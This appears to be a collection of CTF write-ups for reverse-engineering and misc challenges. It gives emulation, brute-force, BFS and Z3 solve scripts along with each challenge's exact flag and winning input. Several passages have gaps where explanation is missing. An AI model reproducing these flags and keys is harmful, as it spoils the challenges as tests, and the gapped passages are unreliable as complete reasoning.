- The final template `leagueSea223` prints `false` iff tape cell `sea[3]` is non-zero at the end.
- Right before printing, the program *always* increments `sea[3]` once (`_helpers.tpl:11713`), so to succeed you need `sea[3] == 255` right before that.
- Instead of decompiling 12k lines, emulate the templates with Go `text/template` + a small Sprig/Helm-ish function set.
- Run the VM once with 41 zero bytes, record a per-byte offset from tape cell `sea[1]`, and invert it to recover the input flag.

### Background Knowledge

#### Helm Templates (Go `text/template`)

Helm charts are rendered using Go templates. A template can:
- Call named templates with `include "name" .` (returns a string).
- Build/modify maps with helpers like `dict` and `set`.
- Perform basic arithmetic (often via Sprig functions).

This challenge leans hard on those features: it implements a “program” as a huge graph of `define` blocks and `include` calls.

#### Sprig-Style Helpers (`dict`, `set`, `default`, `ternary`)

The chart relies on a handful of common Helm/Sprig helpers:
- `dict` creates a map.
- `set` mutates a map.
- `default` returns a fallback value if a value is “empty”.
- `ternary` chooses between two values based on a boolean.

Those are enough to implement a mutable tape VM in a “pure template” environment.

### Solution

#### Step 1: Initial Reconnaissance

Start at the rendered output.

`helm-hell/templates/output.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: output
data:
  result: {{- include "replicaHandler7951" . | quote }}
```

So our target is whatever `replicaHandler7951` returns.

Locate the entrypoint in `helm-hell/templates/_helpers.tpl`:

```text
5429:{{- define "leagueSea223" -}}
8510:{{- define "volumeWorker7940" -}}
12842:{{- define "replicaHandler7951" -}}
```

And the `replicaHandler7951` body:

```gotemplate
{{- define "replicaHandler7951" -}}
{{- $mooringBay7952 := dict "sea" (dict) "helm" 0 "cargo" "" "provisions" (default "" .Values.input) "logbook" 0 -}}
{{- include "volumeWorker7940" $mooringBay7952 -}}
{{- $mooringBay7952.cargo -}}
{{- end -}}
```

This is a VM state dict:
- `sea`: tape (map of cell index string -> byte value)
- `helm`: tape pointer
- `cargo`: output accumulator
- `provisions`: input (`.Values.input`)
- `logbook`: input index

#### Step 2: Find The Success Condition

Near the end of `volumeWorker7940`, we eventually call a final routine:

```gotemplate
{{- $captainRoute7935 := dict "sea" $sea "helm" $helm "cargo" $cargo "provisions" $provisions "logbook" $logbook -}}
{{- include "leagueSea223" $captainRoute7935 -}}
{{- $cargo = $captainRoute7935.cargo -}}
```

`leagueSea223` is the final “printer”. With tracing, right before it runs the pointer ends at `helm=3`.

The important observation is that `leagueSea223` prints `false` if the current tape cell is non-zero.
So at the end it behaves like:

> if `sea[3] != 0` then output `false`  
> else keep the existing output (which the program can set to `true`)

Now look at this snippet in `helm-hell/templates/_helpers.tpl`:

```text
11710  {{- $knotLeague6906 := printf "%d" $helm -}}
11711  {{- $beaconMile6907 := default 0 (index $sea $knotLeague6906) -}}
11712  {{- $controllerStream6908 := ternary 1 0 true -}}
11713  {{- $_ := set $sea $knotLeague6906 (mod (add $beaconMile6907 $controllerStream6908) 256) -}}
```

At that point `helm == 3`, so this is an unconditional increment:

> `sea[3] = (sea[3] + 1) mod 256`

That means the only way to reach `sea[3] == 0` at the printer is:

> `sea[3] == 255` right before line 11713

So this chart is a standard “checker”: correct input drives the machine state to a specific value right before the final print.

#### Step 3: Emulate The Chart And Extract The Expected Input

There is no `helm` CLI available here, so I emulated the chart with Go’s `text/template`, implementing only the functions the VM uses (`include`, `dict`, `set`, `default`, `ternary`, arithmetic).

Key trick: run the VM once with an input of 41 zero-bytes and record a per-step “offset” from tape cell `sea[1]` as `logbook` advances. Then invert it:

> `expected_byte[i] = (-offset[i]) mod 256`

Full solver:

```go
// solve.go
// (see file `solve.go` in this directory for the full commented source)
```

Run it (note: set `GOCACHE` somewhere writable):

```bash
cd "rev/helm hell"
GOCACHE=/tmp/go-build-cache go run solve.go
```

Output:

```text
lactf{t4k1ng_7h3_h3lm_0f_h31m_73mp14t3s}
```

#### Step 4: Capturing The Flag (Verification)

`solve.go` also sanity-checks by feeding the recovered string back into the chart entry template and verifying it returns `true`:

```text
verify: true
```

So the final flag is:

```text
lactf{t4k1ng_7h3_h3lm_0f_h31m_73mp14t3s}
```

### Tools Used

| Tool | Purpose |
|------|---------|
| `rg` | Fast search through the huge `_helpers.tpl` for entrypoints and I/O sites |
| Go (`text/template`) | Helm-like template emulator to run/trace the VM locally |
| Custom solver (`solve.go`) | Extract the expected `.Values.input` and verify it renders `true` |

### Lessons Learned

#### What I Learned
- Helm templates are powerful enough to implement a full tape VM if you have `dict`, `set`, `include`, and arithmetic.
- When a checker is heavily obfuscated, emulation + state tracing can beat static reading by orders of magnitude.
- In many “VM checker” problems, you can often recover the secret by running it on a controlled input and observing a linear relation.

#### Mistakes Made
- Spending time trying random inputs before identifying the final gating condition (`sea[3]` at the printer).
- Underestimating how useful it is to hook a single primitive (`set`) for tracing.

#### Future Improvements
- Automate template emulation scaffolding for similar “Helm VM” challenges (reusable Sprig subset + tracing hooks).
- Add more rigorous type/empty semantics to match Helm/Sprig exactly when needed.

### References

- Helm template functions and pipelines (official Helm docs)
- Go `text/template` documentation
- Sprig function library (common Helm function source)

### Tags

`rev` `helm` `go-template` `sprig` `vm` `emulation` `dynamic-analysis`



---


### [rev] lactf-1986



### Challenge Description
Dug around the archives and found a floppy disk containing a long-forgotten LA CTF challenge from 1986. Can you recover the flag?

- **Category**: Reverse Engineering
- **Platform**: MS-DOS (16-bit)
- ****: `CHALL.IMG` (Floppy Image), `CHALL.EXE`

### Initial Analysis
The challenge provides a floppy disk image. Extracting the contents reveals a 16-bit MS-DOS executable named `CHALL.EXE`.

#### Static Analysis
Using `radare2` with `asm.bits=16`, we identified three core functions:

1.  **Hash Function (`0x10`)**:
    Computes a 20-bit hash of the input string.
    ```python
    def lfsr_hash(data):
        state = 0
        for b in data:
            state = (state * 67 + b) & 0xFFFFF
        return state
    ```

2.  **LFSR Step Function (`0x7b`)**:
    Advances a 20-bit Linear Feedback Shift Register.
    ```python
    def lfsr_step(state):
        feedback = ((state >> 3) ^ state) & 1
        return ((state >> 1) | (feedback << 19)) & 0xFFFFF
    ```

3.  **Validation Loop (`0xb0`)**:
    - Reads user input (73 characters).
    - Checks for the `lactf{` prefix.
    - Computes the hash of the input to use as the **initial LFSR state**.
    - For each character, steps the LFSR and XORs the low byte of the state with the input.
    - Compares the result against an internal ciphertext stored at file offset `0x2506`.

### The Fixed-Point Problem
The validation presents a circular dependency: the keystream depends on the hash of the *full flag*, but the flag is decrypted using that keystream. 

However, because the LFSR state is only 20 bits ($2^{20} \approx 10^6$), we can brute-force the initial state by:
1.  Guessing the initial state.
2.  Generating the first 6 bytes of the keystream.
3.  Checking if `ciphertext[0:6] ^ keystream[0:6] == "lactf{"`.
4.  For any match, decrypting the full ciphertext and verifying if `hash(plaintext) == initial_state`.

### Solution Script
```python
ciphertext = bytes.fromhex("b68c958f9b854c5eecb6b8c097930b587750b02c7e287af1b604efbe5c4478e89981048f0340a73ffab708016352e3add1859f9421d52a5c20d43112ceaa16c7addf295d72fc24902c")

def lfsr_step(state):
    feedback = ((state >> 3) ^ state) & 1
    return ((state >> 1) | (feedback << 19)) & 0xFFFFF

def lfsr_hash(data):
    state = 0
    for b in data:
        state = (state * 67 + b) & 0xFFFFF
    return state

prefix = b"lactf{"
required_ks = [ciphertext[i] ^ prefix[i] for i in range(len(prefix))]

for s in range(0x100000):
    state = s
    match = True
    for i in range(len(prefix)):
        state = lfsr_step(state)
        if (state & 0xFF) != required_ks[i]:
            match = False
            break
    if match:
        # Candidate found, verify hash
        temp_state = s
        flag = []
        for i in range(len(ciphertext)):
            temp_state = lfsr_step(temp_state)
            flag.append(ciphertext[i] ^ (temp_state & 0xFF))
        flag_bytes = bytes(flag)
        if lfsr_hash(flag_bytes) == s:
            print(f"Flag: {flag_bytes.decode()}")
            break
```

### Flag
`lactf{3asy_3nough_7o_8rute_f0rce_bu7_n0t_ea5y_en0ugh_jus7_t0_brut3_forc3}`


---


### [rev] starless-c



### TL;DR

The program is a tiny WASD maze implemented as many 0x1000-byte ELF `LOAD` segments. Each move can “transfer” a 4-byte `NOP` marker (`0x90`) between segment bases. If you arrange for a specific chain of segment bases to start with `NOP`s, pressing `f` jumps into a trampoline chain that reaches the flag-printing routine (which `open()`s and `sendfile()`s `flag.txt` on the remote).

Flag:

`lactf{starless_c_more_like_starless_0xcc}`

Final input (send exactly these bytes to the service):

```
sddddswaasdwaaasdssawwdwddsawasassdddwsddwasaaaawwdwdddsawaasassdddwwdwasssaaawwdwwassdddssddwasaaawwddwdsaaawdsassddwsddwawaawasdddssawdwaaddwaaf
```

You can also generate it with `python3 rev/starless-c/solve.py`.

If you're already in `rev/starless-c/`, run `python3 solve.py`.

### 1. What The Binary Does

`starless_c` is a statically linked ELF **with no section headers**. Program headers reveal many 0x1000-byte `LOAD` segments mapped at unusual addresses.

The entry segment:

1. Prints:
   - `There is a flag in the binary. ...`
2. Installs a SIGSEGV handler that prints:
   - `And so the son of the fortune-teller ... Not yet.`
3. Jumps into a “room” at `0x6767900c`.

Each room implements the same loop:

- `read(0, &c, 1)` one byte at a time
- ignore `\\n`
- accept only `w`, `a`, `s`, `d`, `f`
- anything else (or EOF) triggers a deliberate NULL write and the SIGSEGV handler prints “Not yet.”

### 2. Room Template And The “NOP Token”

In a room, each direction block looks like:

1. Load `eax = *(uint32_t*)target_base`
2. If `al == 0x90` (target starts with `NOP`):
   - overwrite `*(uint32_t*)target_base = 0x0088c031` (bytes `31 c0 88 00`, the crash gadget)
   - store the *old* `eax` into some `recipient_base`
3. Jump to `target_base + 0x0c` (the next room loop)

So, if a segment base starts with `0x90`, moving into it **consumes** that `NOP` marker and can **transfer** it to another segment base (the `recipient_base`), depending on the room.

Practical view: you are shuffling a limited number of “NOP tokens” across segment bases.

### 3. The `f` Trampoline Chain (The Goal)

Pressing `f` in a room does a direct jump to the base of:


Those segment bases contain:

- 4 bytes that crash immediately unless they’re patched to `NOP`s
- at `+0x4`, an unconditional `jmp` to the next trampoline

The chain is:

1. `0x6767a000` -> `0x67682000`
2. `0x67682000` -> `0x6768a000`
3. `0x6768a000` -> `0x67691000`
4. `0x67691000` -> `0x67692000`
5. `0x67692000` -> `0x42069000`

`0x42069000` prints extra flavor text, then does:


So the objective is to ensure the first 4 bytes at each of these bases are `0x90 0x90 0x90 0x90` at the moment you press `f`.

### 4. Solving Systematically

Because each move updates state (which bases currently start with `0x90`), the clean approach is to:

1. Parse program headers to enumerate mapped 0x1000 segments.
2. Disassemble each segment’s room loop at `base+0xc` and extract transitions for `w/a/s/d/f`.
3. Model state as:
   - current room position (`base+0xc`)
   - which mapped bases currently have a `NOP` marker (bitmask)
4. Run BFS until we reach a state where all required trampoline bases are marked `NOP`.
5. Append `f`.

That’s exactly what `rev/starless-c/solve.py` does.

### 5. Running

Remote solve (recommended):

```bash
cd ~/Downloads/ctf/lac_2026/rev/starless-c
python3 solve.py --remote --no-echo
```

Print the input:

```bash
python3 rev/starless-c/solve.py
```

Local test (optional): create a `flag.txt` in the working directory and run:

```bash
python3 rev/starless-c/solve.py --run
```

Remote:

```bash
nc chall.lac.tf 32223
```

Paste the printed sequence (it’s one long line ending in `f`). The service should print the flag.


---


### [rev] the-three-sat-problem



### Summary
The binary asks for a 1279-character bitstring (`'0'`/`'1'`). Internally it evaluates a giant straight-line boolean circuit (a “3-SAT instance”) over those bits. If the circuit evaluates to `true`, it prints 40 bytes that are assembled from selected input bits. Those 40 bytes are the flag.

Flag: `lactf{is_the_three_body_problem_np_hard}`

Repro script: `python3 rev/the-three-sat-problem/solve.py`

### 1. Recon: what does the program want?
Running `three_sat_problem` prints:

- then exits with `Please be serious...` unless you provide a very specific input.

Disassembling the entrypoint shows it:

1. Reads a line into a buffer with `fgets(buf, 0x500, stdin)`.
2. Strips the newline using `strcspn(buf, "\n")`.
3. Requires the resulting length to be exactly `0x4ff` (1279) characters.
4. Requires every character to be `'0'` or `'1'`.
5. Calls a huge function at `0x1289` and checks `AL` (the low byte of `EAX`) is nonzero.
6. Also checks `buf[754] & 1` is set (so `buf[754]` must be `'1'`).

Only if all checks pass does it print:

`Incredible! Let me get the flag for you...`

### 2. The flag printing logic (easy part)
After the success check, `main` builds a 40-byte output buffer and prints it with `puts`.

The key loop runs for `0x140` iterations (320 bits). It uses a table in `.rodata` at file offset `0x13080`. Each table entry is a 32-bit index `tbl[i]` in `0..1278`.

Pseudocode for the print loop:

```c
uint8_t out[40] = {0};
for (int i = 0; i < 0x140; i++) {
  int idx = tbl[i];               // 32-bit from .rodata
  uint8_t bit = buf[idx] & 1;     // only the LSB matters
  out[i >> 3] |= bit << (i & 7);  // pack LSB-first within each byte
}
puts((char*)out);
```

So if we can find any input bitstring that passes the SAT check, we can reconstruct the exact bytes the program prints.

### 3. The SAT check is a straight-line boolean circuit
The function at `0x1289` is ~13k x86-64 instructions, but it has:

- no jumps/branches
- no calls
- only bitwise/boolean-ish operations (`mov`, `not`, `and`, `or`, `xor`) plus stack setup/teardown (`push`, `pop`, `sub/add rsp, imm`)

This is a classic “compiler generated boolean circuit” pattern: it loads input bits and constants, combines them through logic gates, and returns a 1-bit result in `AL`.

Important observation from the flag-print loop: the program only ever uses `buf[idx] & 1`. That strongly suggests the SAT checker only cares about the LSB of each input byte as well.

Rather than decompile thousands of instructions, we can *lift* the SAT checker as a boolean circuit and solve it with Z3.

### 4. Lifting approach: emulate 1-bit semantics
We emulate the SAT function instruction-by-instruction, but track only **one bit** per register/memory location:

- Represent each input bit as a Z3 `Bool`: `b[i]` where `True` means `buf[i]` is `'1'`.
- Model memory reads from the input buffer as `b[i]`.
- Model stack temporaries as a map `stack_addr -> Bool`.
- Model registers as `base_reg -> Bool`.

Instruction semantics under this 1-bit model:

- `mov dst, src`: copy the boolean value
- `push/pop` and `sub/add rsp, imm`: only update a concrete `rsp` so stack addressing works

This works here because the SAT function uses only operations that make sense under boolean semantics, and (critically) it masks values down to one bit throughout the circuit.

### 5. Constraints and solving
From `main`, we need:

1. The SAT check returns true: `ret == True`
2. The extra gate `buf[754] & 1 != 0`, i.e. `b[754] == True`

Then Z3 gives a satisfying assignment for all `b[i]`.

### 6. Decoding the output bytes (the flag)
With a satisfying model, we rebuild the printed output exactly as the binary does:

```python
out = bytearray(40)
for i in range(320):
    bit = model[b[tbl[i]]]
    out[i >> 3] |= int(bit) << (i & 7)
print(out.split(b"\\0", 1)[0].decode())
```

That prints:

`lactf{is_the_three_body_problem_np_hard}`

### 7. Reference implementation
`rev/the-three-sat-problem/solve.py` implements:

- Capstone-based disassembly of the SAT function (`0x1289`..`0x12981`)
- 1-bit boolean lifting for registers/stack/input
- Z3 solve for `b[754] == 1` and `ret == 1`
- Flag reconstruction via the `.rodata` table at `0x13080`

Run:

```bash
python3 rev/the-three-sat-problem/solve.py
```



---


## MISC

---


### [misc] endians



### Prompt

> I was reading about Unicode character encodings until one day, my flag turned into Japanese! Does little-endian mean the little byte's at the end or that the characters start with the little byte?




 `lactf{...}`

### Recon / Observations

`chall.txt` looks like a bunch of CJK-looking Unicode characters, not ASCII.

The fastest clue is to inspect the *code points* of the decoded text:

```python
from pathlib import Path
s = Path("misc/endians/chall.txt").read_text(encoding="utf-8")
print([hex(ord(c)) for c in s[:10]])
```

This prints:

```
0x6c00 0x6100 0x6300 0x7400 0x6600 0x7b00 0x3100 0x5f00 0x7300 0x7500 ...
```

Those are suspicious: if you swap the bytes in each 16-bit value (e.g. `0x6c00 -> 0x006c`), you get ASCII:

- ...

So the file is effectively “ASCII characters stored as UTF-16 code units with the bytes flipped”.

This matches the provided `gen.py` shape:

```py
text = "lactf{REDACTED}"
endian = text.encode(encoding="???").decode(encoding="???")
with open("chall.txt", "wb") as file:
    file.write(endian.encode())
```

The bug is: encode with one UTF-16 endianness, then decode with the other.

### Why This Happens

UTF-16 encodes characters as 16-bit units (2 bytes each).

- Little-endian: low byte first, then high byte.
- Big-endian: high byte first, then low byte.

If you take ASCII text like `l` (0x006c) and interpret its bytes in the opposite endianness, you read it as 0x6c00, which is a totally different Unicode character (often rendered as CJK-looking glyphs).

### Solve

If `chall.txt` is text where each 16-bit unit has its bytes swapped, we can reverse it by re-encoding and decoding with the opposite pair:

```python
from pathlib import Path

s = Path("misc/endians/chall.txt").read_text(encoding="utf-8")


flag = s.encode("utf-16be").decode("utf-16le")

print(flag)
```

Note: `s.encode("utf-16le").decode("utf-16be")` also works here; either direction is just a per-code-unit byte swap.

### Flag

`lactf{1_sur3_h0pe_th1s_d0es_n0t_g3t_l0st_1n_translati0n!}`



---


### [misc] grammar



### Prompt

> Inspired by CS 131 Programming Languages, I decided to make a context-free grammar in EBNF for my flag! But it looks like some squirrels have eaten away at the parse tree...




 `lactf{...}`

### Given Grammar (EBNF)

From `misc/grammar/grammar-notes.txt`:

```ebnf
flag = start, word, {underscore, word}, end;
start = "l", "a", "c", "t", "f", "{";
end = "}";
underscore = "_";
word = fragment, {fragment};

fragment = cd | vc | vd | c | d;
cd = con, dig;
vc = vow, con;
vd = vow, dig;
c = con;
d = dig;

con = "f" | con2;
con2 = "g" | con3;
con3 = "p" | con4;
con4 = "t" | con5;
con5 = "r";

vow = "e" | vow2;
vow2 = "o" | vow3;
vow3 = "u";

dig = "0" | dig2;
dig2 = "1" | dig3;
dig3 = "4" | dig4;
dig4 = "5";
```

Notes also say:
- Boxes are terminals (characters).
- Circles are nonterminals.
- Same color circle means the same nonterminal (black circles can be any).
- Some vertical lines are omitted for space.
- Accessibility hint for the colored circles: `ABACDE BC EAEA`.

### Key Idea

The parse tree in `misc/grammar/tree.png` is mostly intact at the leaves: the bottom row contains 28 terminal boxes. That should be the full flag string.

Structure of `flag` is fixed:

- `start` always yields `lactf{` (6 terminals).
- Then 1 `word`.
- Then some number of (`underscore`, `word`) pairs.
- Then `end` yields `}` (1 terminal).

In the tree, there are exactly two underscores, so the flag is:

```
lactf{ WORD1 _ WORD2 _ WORD3 }
```

### What The Colored Circles Mean

There are 5 nonterminals under `fragment`:

- `cd` (consonant + digit)
- `vc` (vowel + consonant)
- `vd` (vowel + digit)
- `c` (single consonant)
- `d` (single digit)

The picture uses 5 colors (labeled A-E in the accessibility hint) for these 5 `fragment` alternatives.

The hint `ABACDE BC EAEA` groups the colored fragment-nodes per word:

- WORD1 fragments: `A B A C D E`
- WORD2 fragments: `B C`
- WORD3 fragments: `E A E A`

You can map each color to a fragment type by looking at its branching:

- If the colored node splits into 2 children, it is one of `cd/vc/vd`.
- If it has only 1 child, it is `c` or `d`.
- For 2-child nodes, whether the left side is a vowel-stack vs consonant-stack tells you `vc/vd/cd`.

From the tree, this mapping is:


(You can sanity-check this against the final words; it matches perfectly.)

### Decoding Letters: Counting The “Choice Chain” Depth

The grammar encodes each `con/vow/dig` using a chain of nonterminals:

Consonants:

Vowels:

Digits:

In the parse tree, each step down that chain is drawn as another black circle in a vertical stack (some connecting lines are missing, but the circles are still there). So you decode a terminal by counting how many black circles are in its stack before the terminal box.

### Reconstructing The Words

Using the fragment-color sequence per word, then counting the stacks to get the specific `con/vow/dig` terminals:

WORD1 (`A B A C D E`):

So WORD1 = `pr0fe55or`.

WORD2 (`B C`):

So WORD2 = `p4u1`.

WORD3 (`E A E A`):

So WORD3 = `eggert`.

### Flag

Putting it together with the fixed `start`, underscores, and `end`:

`lactf{pr0fe55or_p4u1_eggert}`



---


### [misc] not-just-a-hobby



### 



### TL;DR

The provided `v.v` is a Verilog module that turns specific `(x, y)` coordinates black. Those coordinates form a 128x128 pixel-art image. Rendering it reveals the flag:

`lactf{graph1c_d3sign_is_My_PA55i0N!!1!}`

### Observations

`v.v`:

- Has inputs `input [6:0] x` and `input [6:0] y` (7-bit each), so `x,y ∈ [0, 127]`.
- Has outputs `vga_r/g/b`.
- Contains one giant condition of the form:

  - `if ((x == ... && y == ...) || (x == ... && y == ...) || ...) begin`
  - then sets:
    - `vga_r = 4'h0;`
    - `vga_g = 4'h0;`
    - `vga_b = 4'h0;`

Meaning: for those coordinate pairs, the pixel should be black (0,0,0). Everything else is left as default/unassigned in the snippet, but for our purposes the black pixels are the information.

#### Important Verilog Detail (Why 128x128)

Many constants are written as `7'dNNN`, e.g. `x == 7'd588`.

In Verilog, a sized constant like `7'd588` is truncated to 7 bits, so:


So those comparisons are actually valid for a 7-bit input.

Some constants are unsized decimals like `x == 588`. Those are not truncated and will never match a 7-bit `x` (0..127), so they can be ignored unless the value already lies in 0..127.

### Solution

1. Parse `v.v` and extract every `(x == something && y == something)` pair.
2. Evaluate each constant:

   - If token is sized like `7'dNNN`, apply truncation to 7 bits (the parser does this generically for `w'dNNN`).
   - If token is unsized like `NNN`, keep it as-is.

3. Keep only pairs where both values are in `0..127` (reachable by 7-bit `x,y`).
4. Create a 128x128 image and set those coordinates to black.
5. Upscale the image (nearest-neighbor) so the text is readable.
6. Read the flag off the rendered image.

### Reproduction

The solver script is saved as `misc/not-just-a-hobby/solve.py`.

Run:

```bash
python3 misc/not-just-a-hobby/solve.py
```

It writes:

- `misc/not-just-a-hobby/render.png` (128x128)
- `misc/not-just-a-hobby/render_x8.png` (1024x1024, easier to read)
- `misc/not-just-a-hobby/render.txt` (ASCII preview)
- `misc/not-just-a-hobby/render.pbm` (portable bitmap)

Open `render_x8.png` and the text in the image contains the flag.

### Flag

`lactf{graph1c_d3sign_is_My_PA55i0N!!1!}`



---


{% endraw %}